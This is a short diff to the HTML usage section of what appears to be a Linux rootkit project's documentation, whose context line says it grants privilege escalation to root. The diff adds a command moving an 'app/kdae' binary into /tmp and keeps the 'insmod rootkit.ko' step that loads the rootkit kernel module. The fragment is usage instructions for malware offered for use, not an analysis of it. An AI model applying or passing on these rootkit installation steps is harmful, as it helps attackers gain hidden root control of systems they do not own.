@@ -25,5 +25,5 @@ You can privilege escalation to root user.<br>
 <br>
 <br>
 <h3>Usage</h3>
+&#35;mv app/kdae /tmp<br>
 &#35;insmod rootkit.ko<br>
-&#35;app/kdae<br>
